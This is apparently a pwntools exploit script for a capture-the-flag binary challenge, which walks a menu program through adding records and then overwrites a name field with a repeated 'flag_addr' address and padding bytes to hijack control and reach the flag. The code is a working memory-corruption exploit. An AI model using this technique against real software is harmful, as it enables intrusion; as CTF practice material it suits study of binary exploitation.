from pwn import *
p=process('./main')
#p=remote('challs.watctf.org', 5151)
sleep(1)
for i in range(5):
    p.sendlineafter(b'choice: ',b'1')
    p.sendlineafter(b'age: ',str(i).encode())
    p.sendlineafter(b'name: ',str(i).encode())

p.sendline(b'3')
p.sendlineafter(b'person: ',b'1')
p.sendlineafter(b'choice: ',b'2')
p.sendlineafter(b'new name: ',p64(0x49b216)*3)#flag_addr
 
p.sendline(b'3')
p.sendlineafter(b'person: ',b'0')
p.sendlineafter(b'choice: ',b'2')
p.sendlineafter(b'new name: ',b'a'*24)

p.sendlineafter(b'choice: ',b'2')
p.sendlineafter(b'person: ',b'2')
p.sendline(b'2')
p.interactive()
